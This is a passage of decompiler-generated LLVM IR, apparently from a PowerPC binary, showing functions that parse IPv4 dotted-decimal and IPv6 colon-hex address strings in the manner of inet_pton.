  %v2_100131f0 = load i8, i8* %v1_100131f0, align 1
  %v1_100131f4 = add i32 %v0_100131f0, 1
  %v3_100131f8 = icmp eq i8 %v2_100131f0, 0
  %v4_100131fc = icmp eq i8 %v0_100131fc8.in, %v2_100131f0
  %brmerge = or i1 %v3_100131f8, %v4_100131fc
  br i1 %brmerge, label %dec_label_pc_10013204, label %dec_label_pc_100131f0

dec_label_pc_10013204:                            ; preds = %dec_label_pc_100131f0
  br i1 %v3_100131f8, label %dec_label_pc_10013228, label %dec_label_pc_1001320c

dec_label_pc_1001320c:                            ; preds = %dec_label_pc_10013204
  %v1_1001320c = add i32 %v0_1001320c, 1
  %v1_10013210 = add i32 %v0_10013210, 1
  %v1_10013214 = inttoptr i32 %v1_10013210 to i8*
  %v2_10013214 = load i8, i8* %v1_10013214, align 1
  %v3_10013218 = icmp eq i8 %v2_10013214, 0
  br i1 %v3_10013218, label %dec_label_pc_10013228, label %dec_label_pc_10013220

dec_label_pc_10013220:                            ; preds = %dec_label_pc_100131e4, %dec_label_pc_1001320c
  %v0_10013210 = phi i32 [ %v1_10013210, %dec_label_pc_1001320c ], [ %v0_100132141, %dec_label_pc_100131e4 ]
  %v0_1001320c = phi i32 [ %v1_1001320c, %dec_label_pc_1001320c ], [ 0, %dec_label_pc_100131e4 ]
  %v0_100131fc8.in = phi i8 [ %v2_10013214, %dec_label_pc_1001320c ], [ %v2_100132143, %dec_label_pc_100131e4 ]
  br label %dec_label_pc_100131f0

dec_label_pc_10013228:                            ; preds = %dec_label_pc_1001320c, %dec_label_pc_10013204, %dec_label_pc_100131e4
  %v0_10013228 = phi i32 [ 0, %dec_label_pc_100131e4 ], [ %v1_1001320c, %dec_label_pc_1001320c ], [ %v0_1001320c, %dec_label_pc_10013204 ]
  ret i32 %v0_10013228

; uselistorder directives
  uselistorder i32 %v0_100131f0, { 1, 0 }
  uselistorder label %dec_label_pc_10013220, { 1, 0 }
  uselistorder label %dec_label_pc_100131f0, { 1, 0 }
}

define i32 @function_10013230(i32 %arg1) local_unnamed_addr {
dec_label_pc_10013230:
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  %v0_10013244 = call i32 @function_1000df60()
  %v1_10013248 = add i32 %v0_10013244, 1
  store i32 %v1_10013248, i32* @r29, align 4
  store i32 268513876, i32* @lr, align 4
  %v1_10013250 = call i32 @function_1000ef60(i32 %v1_10013248)
  store i32 %v1_10013250, i32* @r3, align 4
  %v0_10013254 = load i32, i32* @r28, align 4
  store i32 %v0_10013254, i32* @r4, align 4
  store i32 %v1_10013250, i32* @r31, align 4
  %v3_10013258 = icmp eq i32 %v1_10013250, 0
  %v0_1001325c = load i32, i32* @r29, align 4
  store i32 %v0_1001325c, i32* @r5, align 4
  br i1 %v3_10013258, label %dec_label_pc_10013268, label %dec_label_pc_10013264

dec_label_pc_10013264:                            ; preds = %dec_label_pc_10013230
  store i32 268513896, i32* @lr, align 4
  %v0_10013264 = call i32 @function_1000dcb0()
  %v0_1001326c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10013268

dec_label_pc_10013268:                            ; preds = %dec_label_pc_10013230, %dec_label_pc_10013264
  %v0_1001326c = phi i32 [ 0, %dec_label_pc_10013230 ], [ %v0_1001326c.pre, %dec_label_pc_10013264 ]
  ret i32 %v0_1001326c

; uselistorder directives
  uselistorder i32 (i32)* @function_1000ef60, { 5, 0, 3, 2, 1, 11, 10, 9, 8, 7, 4, 6 }
  uselistorder label %dec_label_pc_10013268, { 1, 0 }
}

define i32 @function_10013280(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10013280:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10013288 = call i32 @__asm_mfcr()
  store i32 %v0_10013288, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_1001329c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1001329c, i32* %r7.global-to-local, align 4
  store i32 0, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10013300

dec_label_pc_100132b0:                            ; preds = %dec_label_pc_10013300
  %v1_10013314 = add i32 %v0_10013310, -48
  %v2_10013318 = icmp ugt i32 %v1_10013314, 9
  br i1 %v2_10013318, label %dec_label_pc_100132ec, label %dec_label_pc_100132b8

dec_label_pc_100132b8:                            ; preds = %dec_label_pc_100132b0
  %v0_100132b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_100132b8 = inttoptr i32 %v0_100132b8 to i8*
  %v2_100132b8 = load i8, i8* %v1_100132b8, align 1
  %v3_100132b8 = zext i8 %v2_100132b8 to i32
  %v1_100132bc = mul nuw nsw i32 %v3_100132b8, 10
  %v2_100132c0 = add i32 %v1_100132bc, %v0_10013310
  %v1_100132c4 = add i32 %v2_100132c0, -48
  %v2_100132c8 = icmp ugt i32 %v1_100132c4, 255
  br i1 %v2_100132c8, label %dec_label_pc_10013348, label %dec_label_pc_100132d0

dec_label_pc_100132d0:                            ; preds = %dec_label_pc_100132b8
  %v1_100132d0 = trunc i32 %v1_100132c4 to i8
  store i8 %v1_100132d0, i8* %v1_100132b8, align 1
  %v0_100132d4 = load i1, i1* @cr4_eq, align 1
  br i1 %v0_100132d4, label %dec_label_pc_100132d8, label %dec_label_pc_10013300.backedge

dec_label_pc_100132d8:                            ; preds = %dec_label_pc_100132d0
  %v0_100132d8 = load i32, i32* %r10.global-to-local, align 4
  %v1_100132d8 = add i32 %v0_100132d8, 1
  store i32 %v1_100132d8, i32* %r10.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  %v2_100132e0 = icmp sgt i32 %v1_100132d8, 4
  br i1 %v2_100132e0, label %dec_label_pc_10013348, label %dec_label_pc_10013300.backedge

dec_label_pc_100132ec:                            ; preds = %dec_label_pc_100132b0
  %v3_100132b0 = icmp eq i32 %v0_10013324, 4
  store i32 0, i32* %r8.global-to-local, align 4
  %v3_1001331c.not = icmp ne i32 %v0_10013310, 46
  %v0_100132f4 = load i1, i1* %cr0_eq.global-to-local, align 1
  %brmerge = or i1 %v3_100132b0, %v0_100132f4
  %or.cond = or i1 %v3_1001331c.not, %brmerge
  br i1 %or.cond, label %dec_label_pc_10013348, label %dec_label_pc_100132fc

dec_label_pc_100132fc:                            ; preds = %dec_label_pc_100132ec
  %v0_100132fc = load i32, i32* %r6.global-to-local, align 4
  %v1_100132fc = trunc i32 %v0_100132fc to i8
  %v2_100132fc = load i32, i32* %r7.global-to-local, align 4
  %v3_100132fc = add i32 %v2_100132fc, 1
  %v4_100132fc = inttoptr i32 %v3_100132fc to i8*
  store i8 %v1_100132fc, i8* %v4_100132fc, align 1
  store i32 %v3_100132fc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10013300.backedge

dec_label_pc_10013300.backedge:                   ; preds = %dec_label_pc_100132fc, %dec_label_pc_100132d0, %dec_label_pc_100132d8
  %v0_10013300.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_10013304.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10013300

dec_label_pc_10013300:                            ; preds = %dec_label_pc_10013300.backedge, %dec_label_pc_10013280
  %v0_10013304 = phi i32 [ %v0_10013304.pre, %dec_label_pc_10013300.backedge ], [ 0, %dec_label_pc_10013280 ]
  %v0_10013308 = phi i32 [ %v0_10013300.pre, %dec_label_pc_10013300.backedge ], [ %v0_10013288, %dec_label_pc_10013280 ]
  %v1_10013300 = inttoptr i32 %v0_10013308 to i8*
  %v2_10013300 = load i8, i8* %v1_10013300, align 1
  %v3_10013300 = zext i8 %v2_10013300 to i32
  store i32 %v3_10013300, i32* %r11.global-to-local, align 4
  %v1_10013304 = icmp slt i32 %v0_10013304, 0
  %v2_10013304 = icmp sgt i32 %v0_10013304, 0
  %v3_10013304 = icmp eq i32 %v0_10013304, 0
  store i1 %v3_10013304, i1* %cr0_eq.global-to-local, align 1
  %v1_10013308 = add i32 %v0_10013308, 1
  store i32 %v1_10013308, i32* %r3.global-to-local, align 4
  %v4_1001330c = call i4 @__asm_mcrf_cr0_read(i1 %v1_10013304, i1 %v2_10013304, i1 %v3_10013304, i1 false)
  %v0_10013310 = load i32, i32* %r11.global-to-local, align 4
  %v3_10013310 = icmp eq i32 %v0_10013310, 0
  %v0_10013324 = load i32, i32* %r10.global-to-local, align 4
  br i1 %v3_10013310, label %dec_label_pc_10013324, label %dec_label_pc_100132b0

dec_label_pc_10013324:                            ; preds = %dec_label_pc_10013300
  %tmp9 = icmp slt i32 %v0_10013324, 4
  br i1 %tmp9, label %dec_label_pc_10013348, label %dec_label_pc_1001332c

dec_label_pc_1001332c:                            ; preds = %dec_label_pc_10013324
  store i32 %arg1, i32* @r3, align 4
  store i32 4, i32* @r5, align 4
  store i32 %v2_1001329c, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001333c.841 to i32), i32* @lr, align 4
  %v0_10013338 = call i32 @function_1000dcb0()
  br label %dec_label_pc_10013348

dec_label_pc_10013348:                            ; preds = %dec_label_pc_100132ec, %dec_label_pc_100132b8, %dec_label_pc_100132d8, %dec_label_pc_10013324, %dec_label_pc_1001332c
  %storemerge = phi i32 [ 1, %dec_label_pc_1001332c ], [ 0, %dec_label_pc_10013324 ], [ 0, %dec_label_pc_100132d8 ], [ 0, %dec_label_pc_100132b8 ], [ 0, %dec_label_pc_100132ec ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v1_10013358 = call %1 @__asm_mtcrf(i32 8, i32 %v0_10013288)
  %v4_10013358 = extractvalue %1 %v1_10013358, 2
  store i1 %v4_10013358, i1* %cr0_eq.global-to-local, align 1
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_10013310, { 3, 2, 0, 1 }
  uselistorder i32 %v0_10013304, { 2, 1, 0 }
  uselistorder i32 %v0_10013288, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 3, 2, 1 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1, 3 }
  uselistorder i1* %cr0_eq.global-to-local, { 0, 2, 1 }
  uselistorder i32 255, { 5, 6, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10013348, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10013300.backedge, { 0, 2, 1 }
}

define i32 @function_10013360(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10013360:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10013364 = load i32, i32* @lr, align 4
  store i32 %v0_10013364, i32* %r0.global-to-local, align 4
  %v3_10013368 = icmp eq i32 %arg1, 2
  store i32 %tmp, i32* @r29, align 4
  store i32 %arg3, i32* @r22, align 4
  br i1 %v3_10013368, label %dec_label_pc_1001338c, label %dec_label_pc_10013380

dec_label_pc_10013380:                            ; preds = %dec_label_pc_10013360
  %v3_10013380 = icmp eq i32 %arg1, 10
  br i1 %v3_10013380, label %dec_label_pc_100133a0, label %dec_label_pc_1001353c

dec_label_pc_1001338c:                            ; preds = %dec_label_pc_10013360
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268514200, i32* @lr, align 4
  %v3_10013394 = call i32 @function_10013280(i32 %tmp, i32 %arg3)
  store i32 %v3_10013394, i32* %r3.global-to-local, align 4
  store i32 %v3_10013394, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013554

dec_label_pc_100133a0:                            ; preds = %dec_label_pc_10013380
  %v2_100133a0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_100133a0, i32* %r3.global-to-local, align 4
  store i32 268514224, i32* @lr, align 4
  %v3_100133ac = call i32 @function_1000dd4c(i32 %v2_100133a0, i32 0, i32 16)
  store i32 %v3_100133ac, i32* %r3.global-to-local, align 4
  %v0_100133b0 = load i32, i32* @r29, align 4
  %v1_100133b0 = inttoptr i32 %v0_100133b0 to i8*
  %v2_100133b0 = load i8, i8* %v1_100133b0, align 1
  %v3_100133b0 = zext i8 %v2_100133b0 to i32
  store i32 %v3_100133b0, i32* %r0.global-to-local, align 4
  store i32 %v3_100133ac, i32* @r31, align 4
  %v2_100133b8 = add i32 %v3_100133ac, 16
  store i32 %v2_100133b8, i32* @r27, align 4
  %v3_100133bc = icmp eq i8 %v2_100133b0, 58
  br i1 %v3_100133bc, label %dec_label_pc_100133c4, label %dec_label_pc_100133d0

dec_label_pc_100133c4:                            ; preds = %dec_label_pc_100133a0
  %v1_100133c4 = add i32 %v0_100133b0, 1
  %v2_100133c4 = inttoptr i32 %v1_100133c4 to i8*
  %v3_100133c4 = load i8, i8* %v2_100133c4, align 1
  %v4_100133c4 = zext i8 %v3_100133c4 to i32
  store i32 %v4_100133c4, i32* %r0.global-to-local, align 4
  store i32 %v1_100133c4, i32* @r29, align 4
  %v3_100133c8 = icmp eq i8 %v3_100133c4, 58
  br i1 %v3_100133c8, label %dec_label_pc_100133d0, label %dec_label_pc_10013550

dec_label_pc_100133d0:                            ; preds = %dec_label_pc_100133c4, %dec_label_pc_100133a0
  %v0_100133d0 = phi i32 [ %v1_100133c4, %dec_label_pc_100133c4 ], [ %v0_100133b0, %dec_label_pc_100133a0 ]
  store i32 %v0_100133d0, i32* @r26, align 4
  store i32 0, i32* @r24, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_100134a43036 = inttoptr i32 %v0_100133d0 to i8*
  %v2_100134a43137 = load i8, i8* %v1_100134a43036, align 1
  %v3_100134a43238 = zext i8 %v2_100134a43137 to i32
  store i32 %v3_100134a43238, i32* %r3.global-to-local, align 4
  store i32 268514476, i32* @lr, align 4
  %v1_100134a83339 = call i32 @function_10014108(i32 %v3_100134a43238)
  store i32 %v1_100134a83339, i32* %r3.global-to-local, align 4
  store i32 %v1_100134a83339, i32* @r30, align 4
  %v3_100134ac3440 = icmp eq i32 %v1_100134a83339, 0
  br i1 %v3_100134ac3440, label %dec_label_pc_100134b4, label %dec_label_pc_100133dc.lr.ph

dec_label_pc_100133dc:                            ; preds = %dec_label_pc_100133dc.lr.ph, %dec_label_pc_100134a4.backedge
  %v1_100134a835 = phi i32 [ %v1_100134a83341, %dec_label_pc_100133dc.lr.ph ], [ %v1_100134a8, %dec_label_pc_100134a4.backedge ]
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1001a558.842 to i32), i32* @r25, align 4
  %v0_100133e8 = load i32, i32* @r29, align 4
  %v1_100133e8 = add i32 %v0_100133e8, 1
  store i32 %v1_100133e8, i32* @r29, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1001a558.842 to i32), i32* @r3, align 4
  store i32 268514292, i32* @lr, align 4
  %v3_100133f0 = call i32 @function_1000de0c(i32 ptrtoint ([17 x i8]* @global_var_1001a558.842 to i32), i32 %v1_100134a835)
  store i32 %v3_100133f0, i32* %r3.global-to-local, align 4
  %v3_100133f4 = icmp eq i32 %v3_100133f0, 0
  br i1 %v3_100133f4, label %dec_label_pc_10013414, label %dec_label_pc_100133fc

dec_label_pc_100133fc:                            ; preds = %dec_label_pc_100133dc
  %v0_100133fc = load i32, i32* @r25, align 4
  %v2_100133fc = sub i32 %v3_100133f0, %v0_100133fc
  store i32 %v2_100133fc, i32* %r0.global-to-local, align 4
  %v0_10013400 = load i32, i32* @r28, align 4
  %v1_10013400 = mul i32 %v0_10013400, 16
  store i32 %v1_10013400, i32* %r9.global-to-local, align 4
  %v2_10013404 = or i32 %v1_10013400, %v2_100133fc
  store i32 %v2_10013404, i32* @r28, align 4
  %tmp19 = icmp ult i32 %v2_10013404, 65536
  br i1 %tmp19, label %dec_label_pc_100134a0, label %dec_label_pc_10013550

dec_label_pc_10013414:                            ; preds = %dec_label_pc_100133dc
  %v0_10013414 = load i32, i32* @r30, align 4
  %v3_10013414 = icmp eq i32 %v0_10013414, 58
  br i1 %v3_10013414, label %dec_label_pc_1001341c, label %dec_label_pc_10013470

dec_label_pc_1001341c:                            ; preds = %dec_label_pc_10013414
  %v0_1001341c = load i32, i32* @r23, align 4
  %v3_1001341c = icmp eq i32 %v0_1001341c, 0
  br i1 %v3_1001341c, label %dec_label_pc_10013424, label %dec_label_pc_10013438

dec_label_pc_10013424:                            ; preds = %dec_label_pc_1001341c
  %v0_10013424 = load i32, i32* @r24, align 4
  %v3_10013424 = icmp eq i32 %v0_10013424, 0
  br i1 %v3_10013424, label %dec_label_pc_1001342c, label %dec_label_pc_10013550

dec_label_pc_1001342c:                            ; preds = %dec_label_pc_10013424
  %v0_1001342c = load i32, i32* @r31, align 4
  store i32 %v0_1001342c, i32* @r24, align 4
  %v0_10013430 = load i32, i32* @r29, align 4
  store i32 %v0_10013430, i32* @r26, align 4
  br label %dec_label_pc_100134a4.backedge

dec_label_pc_10013438:                            ; preds = %dec_label_pc_1001341c
  %v0_10013438 = load i32, i32* @r29, align 4
  %v1_10013438 = inttoptr i32 %v0_10013438 to i8*
  %v2_10013438 = load i8, i8* %v1_10013438, align 1
  %v3_10013438 = zext i8 %v2_10013438 to i32
  store i32 %v3_10013438, i32* %r0.global-to-local, align 4
  %v3_1001343c = icmp eq i8 %v2_10013438, 0
  br i1 %v3_1001343c, label %dec_label_pc_10013550, label %dec_label_pc_10013444

dec_label_pc_10013444:                            ; preds = %dec_label_pc_10013438
  %v0_10013444 = load i32, i32* @r31, align 4
  %v1_10013444 = add i32 %v0_10013444, 2
  store i32 %v1_10013444, i32* %r0.global-to-local, align 4
  %v1_10013448 = load i32, i32* @r27, align 4
  %v3_10013448 = icmp ugt i32 %v1_10013444, %v1_10013448
  br i1 %v3_10013448, label %dec_label_pc_10013550, label %dec_label_pc_10013450

dec_label_pc_10013450:                            ; preds = %dec_label_pc_10013444
  %v0_10013450 = load i32, i32* @r28, align 4
  %v1_10013450 = udiv i32 %v0_10013450, 256
  store i32 %v1_10013450, i32* %r0.global-to-local, align 4
  %v1_10013454 = trunc i32 %v0_10013450 to i8
  %v3_10013454 = add i32 %v0_10013444, 1
  %v4_10013454 = inttoptr i32 %v3_10013454 to i8*
  store i8 %v1_10013454, i8* %v4_10013454, align 1
  %v0_10013458 = load i32, i32* %r0.global-to-local, align 4
  %v1_10013458 = trunc i32 %v0_10013458 to i8
  %v2_10013458 = load i32, i32* @r31, align 4
  %v3_10013458 = inttoptr i32 %v2_10013458 to i8*
  store i8 %v1_10013458, i8* %v3_10013458, align 1
  %v0_1001345c = load i32, i32* @r29, align 4
  store i32 %v0_1001345c, i32* @r26, align 4
  %v0_10013460 = load i32, i32* @r31, align 4
  %v1_10013460 = add i32 %v0_10013460, 2
  store i32 %v1_10013460, i32* @r31, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_100134a430 = inttoptr i32 %v0_1001345c to i8*
  %v2_100134a431 = load i8, i8* %v1_100134a430, align 1
  %v3_100134a432 = zext i8 %v2_100134a431 to i32
  store i32 %v3_100134a432, i32* %r3.global-to-local, align 4
  store i32 268514476, i32* @lr, align 4
  %v1_100134a833 = call i32 @function_10014108(i32 %v3_100134a432)
  store i32 %v1_100134a833, i32* %r3.global-to-local, align 4
  store i32 %v1_100134a833, i32* @r30, align 4
  %v3_100134ac34 = icmp eq i32 %v1_100134a833, 0
  br i1 %v3_100134ac34, label %dec_label_pc_100134b4, label %dec_label_pc_100133dc.lr.ph

dec_label_pc_100133dc.lr.ph:                      ; preds = %dec_label_pc_100133d0, %dec_label_pc_10013450
  %v1_100134a83341 = phi i32 [ %v1_100134a833, %dec_label_pc_10013450 ], [ %v1_100134a83339, %dec_label_pc_100133d0 ]
  br label %dec_label_pc_100133dc

dec_label_pc_10013470:                            ; preds = %dec_label_pc_10013414
  %v3_10013470 = icmp eq i32 %v0_10013414, 46
  br i1 %v3_10013470, label %dec_label_pc_10013478, label %dec_label_pc_10013550

dec_label_pc_10013478:                            ; preds = %dec_label_pc_10013470
  %v0_10013478 = load i32, i32* @r31, align 4
  %v1_10013478 = add i32 %v0_10013478, 4
  store i32 %v1_10013478, i32* @r30, align 4
  %v1_1001347c = load i32, i32* @r27, align 4
  %v3_1001347c = icmp ugt i32 %v1_10013478, %v1_1001347c
  br i1 %v3_1001347c, label %dec_label_pc_10013550, label %dec_label_pc_10013484

dec_label_pc_10013484:                            ; preds = %dec_label_pc_10013478
  %v0_10013488 = load i32, i32* @r26, align 4
  store i32 %v0_10013488, i32* %r3.global-to-local, align 4
  store i32 268514448, i32* @lr, align 4
  %v3_1001348c = call i32 @function_10013280(i32 %v0_10013488, i32 %v0_10013478)
  store i32 %v3_1001348c, i32* %r3.global-to-local, align 4
  %v0_10013490 = load i32, i32* @r30, align 4
  store i32 %v0_10013490, i32* @r31, align 4
  %v2_10013494 = icmp sgt i32 %v3_1001348c, 0
  br i1 %v2_10013494, label %dec_label_pc_100134d8, label %dec_label_pc_10013550

dec_label_pc_100134a0:                            ; preds = %dec_label_pc_100133fc
  store i32 1, i32* @r23, align 4
  %v0_100134a4.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100134a4.backedge

dec_label_pc_100134a4.backedge:                   ; preds = %dec_label_pc_100134a0, %dec_label_pc_1001342c
  %v0_100134a4.be = phi i32 [ %v0_100134a4.pre.pre, %dec_label_pc_100134a0 ], [ %v0_10013430, %dec_label_pc_1001342c ]
  %v1_100134a4 = inttoptr i32 %v0_100134a4.be to i8*
  %v2_100134a4 = load i8, i8* %v1_100134a4, align 1
  %v3_100134a4 = zext i8 %v2_100134a4 to i32
  store i32 %v3_100134a4, i32* %r3.global-to-local, align 4
  store i32 268514476, i32* @lr, align 4
  %v1_100134a8 = call i32 @function_10014108(i32 %v3_100134a4)
  store i32 %v1_100134a8, i32* %r3.global-to-local, align 4
  store i32 %v1_100134a8, i32* @r30, align 4
  %v3_100134ac = icmp eq i32 %v1_100134a8, 0
  br i1 %v3_100134ac, label %dec_label_pc_100134b4, label %dec_label_pc_100133dc

dec_label_pc_100134b4:                            ; preds = %dec_label_pc_100134a4.backedge, %dec_label_pc_100133d0, %dec_label_pc_10013450
  %v0_100134b4 = load i32, i32* @r23, align 4
  %v3_100134b4 = icmp eq i32 %v0_100134b4, 0
  %v0_1001351c.pre.pre = load i32, i32* @r31, align 4
  br i1 %v3_100134b4, label %dec_label_pc_100134d8, label %dec_label_pc_100134bc

dec_label_pc_100134bc:                            ; preds = %dec_label_pc_100134b4
  %v1_100134bc = add i32 %v0_1001351c.pre.pre, 2
  store i32 %v1_100134bc, i32* %r0.global-to-local, align 4
  %v1_100134c0 = load i32, i32* @r27, align 4
  %v3_100134c0 = icmp ugt i32 %v1_100134bc, %v1_100134c0
  br i1 %v3_100134c0, label %dec_label_pc_10013550, label %dec_label_pc_100134c8

dec_label_pc_100134c8:                            ; preds = %dec_label_pc_100134bc
  %v0_100134c8 = load i32, i32* @r28, align 4
  %v1_100134c8 = udiv i32 %v0_100134c8, 256
  store i32 %v1_100134c8, i32* %r0.global-to-local, align 4
  %v1_100134cc = trunc i32 %v0_100134c8 to i8
  %v3_100134cc = add i32 %v0_1001351c.pre.pre, 1
  %v4_100134cc = inttoptr i32 %v3_100134cc to i8*
  store i8 %v1_100134cc, i8* %v4_100134cc, align 1
  %v0_100134d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100134d0 = trunc i32 %v0_100134d0 to i8
  %v2_100134d0 = load i32, i32* @r31, align 4
  %v3_100134d0 = inttoptr i32 %v2_100134d0 to i8*
  store i8 %v1_100134d0, i8* %v3_100134d0, align 1
  %v0_100134d4 = load i32, i32* @r31, align 4
  %v1_100134d4 = add i32 %v0_100134d4, 2
  store i32 %v1_100134d4, i32* @r31, align 4
  br label %dec_label_pc_100134d8

dec_label_pc_100134d8:                            ; preds = %dec_label_pc_100134b4, %dec_label_pc_10013484, %dec_label_pc_100134c8
  %v0_1001351c.pre = phi i32 [ %v0_10013490, %dec_label_pc_10013484 ], [ %v1_100134d4, %dec_label_pc_100134c8 ], [ %v0_1001351c.pre.pre, %dec_label_pc_100134b4 ]
  %v0_100134d8 = load i32, i32* @r24, align 4
  %v3_100134d8 = icmp eq i32 %v0_100134d8, 0
  %v1_1001351c.pre = load i32, i32* @r27, align 4
  %v4_1001351c = icmp eq i32 %v0_1001351c.pre, %v1_1001351c.pre
  br i1 %v3_100134d8, label %dec_label_pc_1001351c, label %dec_label_pc_100134e0

dec_label_pc_100134e0:                            ; preds = %dec_label_pc_100134d8
  %v2_100134e4 = sub i32 %v0_1001351c.pre, %v0_100134d8
  store i32 %v2_100134e4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v4_1001351c, label %dec_label_pc_10013550, label %dec_label_pc_10013504.preheader

dec_label_pc_10013504.preheader:                  ; preds = %dec_label_pc_100134e0
  %v3_1001350424 = icmp slt i32 %v2_100134e4, 1
  %v2_1001350826 = add i32 %v2_100134e4, -1
  store i32 %v2_1001350826, i32* %r11.global-to-local, align 4
  %v2_1001350c27 = add i32 %v1_1001351c.pre, -1
  store i32 2, i32* %r9.global-to-local, align 4
  br i1 %v3_1001350424, label %dec_label_pc_1001351c.thread, label %dec_label_pc_100134f8

dec_label_pc_100134f8:                            ; preds = %dec_label_pc_10013504.preheader, %dec_label_pc_100134f8.dec_label_pc_100134f8_crit_edge
  %v0_100134f8 = phi i32 [ %v0_100134f8.pre, %dec_label_pc_100134f8.dec_label_pc_100134f8_crit_edge ], [ %v0_100134d8, %dec_label_pc_10013504.preheader ]
  %v2_1001350c29 = phi i32 [ %v2_1001350c, %dec_label_pc_100134f8.dec_label_pc_100134f8_crit_edge ], [ %v2_1001350c27, %dec_label_pc_10013504.preheader ]
  %v2_1001350828 = phi i32 [ %v2_10013508, %dec_label_pc_100134f8.dec_label_pc_100134f8_crit_edge ], [ %v2_1001350826, %dec_label_pc_10013504.preheader ]
  %v2_100134f8 = add i32 %v0_100134f8, %v2_1001350828
  %v3_100134f8 = inttoptr i32 %v2_100134f8 to i8*
  %v4_100134f8 = load i8, i8* %v3_100134f8, align 1
  %v5_100134f8 = zext i8 %v4_100134f8 to i32
  store i32 %v5_100134f8, i32* %r0.global-to-local, align 4
  %v3_100134fc = inttoptr i32 %v2_1001350c29 to i8*
  store i8 %v4_100134f8, i8* %v3_100134fc, align 1
  %v0_10013500 = load i32, i32* %r8.global-to-local, align 4
  %v1_10013500 = load i32, i32* @r24, align 4
  %v2_10013500 = load i32, i32* %r11.global-to-local, align 4
  %v3_10013500 = trunc i32 %v0_10013500 to i8
  %v4_10013500 = add i32 %v2_10013500, %v1_10013500
  %v5_10013500 = inttoptr i32 %v4_10013500 to i8*
  store i8 %v3_10013500, i8* %v5_10013500, align 1
  %v0_10013504.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10013504.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_1001350c.pre = load i32, i32* @r27, align 4
  %v3_10013504 = icmp slt i32 %v1_10013504.pre, %v0_10013504.pre
  %v2_10013508 = sub i32 %v1_10013504.pre, %v0_10013504.pre
  store i32 %v2_10013508, i32* %r11.global-to-local, align 4
  %v1_10013510 = add i32 %v0_10013504.pre, 1
  store i32 %v1_10013510, i32* %r9.global-to-local, align 4
  br i1 %v3_10013504, label %dec_label_pc_1001351c.thread, label %dec_label_pc_100134f8.dec_label_pc_100134f8_crit_edge

dec_label_pc_100134f8.dec_label_pc_100134f8_crit_edge: ; preds = %dec_label_pc_100134f8
  %v2_1001350c = sub i32 %v1_1001350c.pre, %v0_10013504.pre
  %v0_100134f8.pre = load i32, i32* @r24, align 4
  br label %dec_label_pc_100134f8

dec_label_pc_1001351c.thread:                     ; preds = %dec_label_pc_100134f8, %dec_label_pc_10013504.preheader
  %v0_10013518.lcssa = phi i32 [ %v1_1001351c.pre, %dec_label_pc_10013504.preheader ], [ %v1_1001350c.pre, %dec_label_pc_100134f8 ]
  store i32 %v0_10013518.lcssa, i32* @r31, align 4
  br label %dec_label_pc_10013524

dec_label_pc_1001351c:                            ; preds = %dec_label_pc_100134d8
  br i1 %v4_1001351c, label %dec_label_pc_10013524, label %dec_label_pc_10013550

dec_label_pc_10013524:                            ; preds = %dec_label_pc_1001351c.thread, %dec_label_pc_1001351c
  %v0_10013524 = load i32, i32* @r22, align 4
  store i32 %v0_10013524, i32* @r3, align 4
  store i32 %v2_100133a0, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10013534.843 to i32), i32* @lr, align 4
  %v0_10013530 = call i32 @function_1000dcb0()
  store i32 %v0_10013530, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013554

dec_label_pc_1001353c:                            ; preds = %dec_label_pc_10013380
  %v0_1001353c = call i32 @function_1000c85c()
  store i32 %v0_1001353c, i32* %r3.global-to-local, align 4
  store i32 97, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
